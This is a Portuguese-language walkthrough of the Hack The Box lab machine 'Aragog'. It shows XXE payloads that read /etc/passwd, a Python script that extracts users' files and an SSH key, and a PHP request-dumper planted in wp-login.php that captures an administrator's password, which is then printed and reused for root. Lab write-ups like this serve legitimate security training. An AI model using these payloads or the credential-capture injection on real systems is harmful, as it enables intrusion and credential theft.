---
title: "Hack The Box - Aragog"
tags: [Linux,Medium,Wordpress,FTP,Gobuster,BurpSuite,PayloadAllTheThings]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/126>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 3 portas abertas

> Porta 21 -> Vsftdp 3.0.3

> Porta 22 -> SSH

> Portas 80 -> Servidor Web

## Enumeração Vsftp 3.0.3

Com o searchsploit verificamos se encontramos exploits para essa versão específica do vsftpd, mas não tem

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_ftp.png)

### Tentamos login anonymous no ftp

Logamos e baixamos o arquivo test.txt

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_ftp1.png)

Verificamos que é um endereço de máscara de subrede

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_ftp2.png)

## Enumeração da porta 80

Abrindo a página verificamos o que tem nela (Porta 80)

Verificamos a página inicial do apache

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_web.png)

### Gobuster

Rodamos o gobuster na página pra verificar se encontramos algo de útil, uma vez que nos deu apenas a página padrão do apache e estamos sem rumo

> gobuster dir -u http://10.10.10.78 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 50

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_gobuster.png)

Explicação Gobuster

> dir -> Modo escaneamento de diretórios

> -u http://10.10.10.78 -> Url que vai ser escaneada

> -w -> A wordlist utilizada

> -x -> Vai testar outros formatos também, no caso php por que a máquina é linux

> -t -> Aumentar o número de threads, pra ir mais rápido

#### Hosts.php

Testamos entrar nesse *hosts.php* pra verificar o que tem nele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_hosts.png)

Vamos mandar para o *BurpSuite*, por que fica melhor de trabalhar e ver o que está acontecendo com a requisição

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_burp.png)

Mandamos para o *Repeater*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_burp1.png)

Trocamos o método de GET para POST, para melhor trabalhar com a requisição

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_burp2.png)

# Explorando XXE Exploit / User Shell

Bom, agora aqui é complicado perceber o que tem que ser feito. Eu pensei: pô tem um arquivo test.txt no FTP, que ele fala de hosts também, aqui fala de hosts... O que será que dá se eu jogar aqui dentro o que estava naquele arquivo txt?

Não é que deu certo?!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_burp3.png)

Certo, mas como podemos explorar isso agora?

Dando uma pesquisada na internet sobre XML RCE, uma vez que eu consigo executar XML e quero uma maneira de ter RCE cheguei até esse GitHub

> https://github.com/swisskyrepo/PayloadsAllTheThings

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_payload.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_payload1.png)

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_payload2.png)

### Testando XXE Exploit

Então vamos testar pra ver se da certo ou não

Adaptamos pra situação e vemos que deu certo, por que aparece o texto Doe do outro lado do servidor

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
<details>
    <subnet_mask>&example;</subnet_mask>
    <test></test>
</details>
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_payload3.png)

Agora podemos ler arquivos dentro do servidor, vamos ler o /etc/passwd

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<details>
    <subnet_mask>&example;</subnet_mask>
    <test></test>
</details>
```
![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_payload4.png)

Logicamente aqui poderiamos ir fazer na mão e encontrar a chave ssh do florian, mas vamos lá, sempre é bom conhecer novas ferramentas e métodos.

### LFISuite

Com o LFISuite temos um monte de diretórios que podemos explorar, tipo uma grande lista pra enumerar quais são os que tem na máquina pra podermos extrair a maior quantidade de arquivos possível

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_lfi.png)

> https://github.com/D35m0nd142/LFISuite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_lfi1.png)

Dando uma vasculhada nesse github encontramos os caminhos que queremos que sejam testados

> https://github.com/D35m0nd142/LFISuite/blob/master/pathtotest.txt

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_lfi2.png)

Passamos pra nossa Kali e damos uma arrumada nele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_lfi3.png)

Tiramos aqui todos que não começam com /

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_lfi4.png)

Agora executamos no *BurpSuite* dentro do *Intruder*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_burp4.png)

Setamos a wordlist criada

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_burp5.png)

Executamos

Bom, ai está bem claro, os que tem tamanho diferente de 213 possivelmente existem

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_burp6.png)

### Script para facilitar essa enumeração

Aqui ele irá pegar todos os usuários do passwd que possuem shell válido, vai entrar um por um e listar os arquivos que estão no arquivos `files.txt` que vamos criar agora

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_file.png)

```
import requests                                                                                                                                                              
from base64 import b64decode                                                                                                                                                
                                                                                                                                                      
def GetFile(fname):                                                                                                                                           
    payload = '<!--?xml version="1.0" ?--><!DOCTYPE replace [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=' + fname + '">] <details><subnet_mask>&file;</subnet_mask><test></test></details>'                                                 
    resp = requests.post('http://10.10.10.78/hosts.php', data=payload)
    fcontent = (resp.text).split(" ")[6]
    fcontent = b64decode(fcontent)
    return fcontent

def GetHomeDir():
        homedir = []
        passwd = GetFile("/etc/passwd")
        lines = iter(passwd.splitlines())
        for line in lines:
            if line.endswith("sh"):
                line = line.split(":")[5]
                homedir.append(line)
        return homedir

for user in GetHomeDir():
    fh = open('file.txt')
    for line in fh:
            abc = GetFile(user + line.rstrip())
            if abc:
                print user + line.rstrip()
                print abc
```

Ao executarmos ele começa a enumeração de usuário com shell válido por usuário

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_script.png)

### Conexão SSH Florian

Encontramos a chave ssh do usuário Florian!

Claro que poderiamos ter feito manualmente pelo burp, mas de novo, é bom sempre fazer esses scripts pra praticar um pouco de programação

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_ssh.png)

# Escalação de Privilégio

Bom, uma vez que já conseguimos acesso ao servidor, vamos iniciar a escalação de privilégio

Dentro da pasta /var/www, lá onde está o hosts.php encontramos uma pasta "estranha" a *dev_wiki*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_dev.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_dev1.png)

Tentamos entrar nesse pasta /dev/wiki pelo navegador

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_dev2.png)

Verificamos que ele faz um redirect pra aragog

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_dev4.png)

Bom, então devemos adicionar esse aragog ao nosso /etc/hosts pra ele poder redirecionar corretamente

## Adicionando aragog ao /etc/hosts

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_aragog.png)

Acessamos novamente a página aragog/dev_wiki

Opa! Conseguimos acessar outra página web

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_dev5.png)

Verificando pelas páginas encontramos um Post na aba Blog, que é interessante

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_blog.png)

Traduzindo (por que sou preguiçoso pra caralho pra ler em inglês)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_trad.png)

Isso possivelmente explica o *zz_backup* na pasta, e também me chamou atenção outra coisa, o fato dele citar que fica constantemente logando... interessante, podemos explorar isso

## Escutando o wp-login.php

Bom, como sei que ele regularmente realiza o login, vou fazer um wp-login com um keylogger da vida, que esse maluco ai fez. Encontrei ele em outros write-ups de máquinas, e é bom ter em mente esse tipo de coisa

> https://github.com/magnetikonline

> https://gist.github.com/magnetikonline/650e30e485c0f91f2f40

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_dump.png)

### Modificando o wp-login.php

```<?php
// https://gist.github.com/magnetikonline/650e30e485c0f91f2f40

class DumpHTTPRequestToFile {

	public function execute($targetFile) {

		$data = sprintf(
			"%s %s %s\n\nHTTP headers:\n",
			$_SERVER['REQUEST_METHOD'],
			$_SERVER['REQUEST_URI'],
			$_SERVER['SERVER_PROTOCOL']
		);

		foreach ($this->getHeaderList() as $name => $value) {
			$data .= $name . ': ' . $value . "\n";
		}

		$data .= "\nRequest body:\n";

		file_put_contents(
			$targetFile,
			$data . file_get_contents('php://input') . "\n"
		);

		echo("Done!\n\n");
	}

	private function getHeaderList() {

		$headerList = [];
		foreach ($_SERVER as $name => $value) {
			if (preg_match('/^HTTP_/',$name)) {
				// convert HTTP_HEADER_NAME to Header-Name
				$name = strtr(substr($name,5),'_',' ');
				$name = ucwords(strtolower($name));
				$name = strtr($name,' ','-');

				// add to list
				$headerList[$name] = $value;
			}
		}

		return $headerList;
	}
}


(new DumpHTTPRequestToFile)->execute('./dumprequest.txt');
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_login.png)

Agora é esperar o maluco logar, quando ele logar vai ir a senha dele pro *dumprequest.txt*

> pwd=%21KRgYs%28JFO%21%26MTr%29lf&wp-submit=Log+In&testcookie=1&log=Administrator&redirect_to=http%3A%2F%2F127.0.0.1%2Fdev_wiki%2Fwp-admin%2F

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_dump1.png)

Está encodado, então devemos realizar o decoder dele, vou usar o *BurpSuite* mesmo, pq já ta aberto, mas pô, tem sites que fazem isso na internet

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_senha.png)

> pwd=!KRgYs(JFO!&MTr)lf

### Virando root!

Possivelmente como ele é o "administrador" deve usar essa mesma senha para login como root, então viramos root com ela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_priv.png)

## Pegamos flag de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_user.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-aragog/A_root.png)

